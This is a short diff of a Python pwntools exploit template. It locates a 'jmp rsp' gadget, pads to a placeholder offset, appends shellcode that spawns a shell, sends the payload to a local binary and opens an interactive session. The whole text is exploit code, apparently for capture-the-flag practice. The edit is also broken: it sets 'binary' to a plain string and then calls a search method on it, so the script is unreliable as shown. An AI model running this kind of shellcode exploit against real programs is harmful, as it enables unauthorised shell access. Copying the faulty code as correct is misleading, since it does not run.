@@ -1,6 +1,7 @@
 from pwn import *
 
-jmp_rsp = next(elf.search(asm('jmp rsp')))
+binary = "binary name"
+jmp_rsp = next(binary.search(asm('jmp rsp')))
 offset = "your offset"
 
 payload = flat(
@@ -9,7 +10,7 @@ payload = flat(
     asm(shellcraft.sh())
 )
 
-p = process("./binary name")
+p = process(binary)
 
 p.send(payload)
 p.interactive()
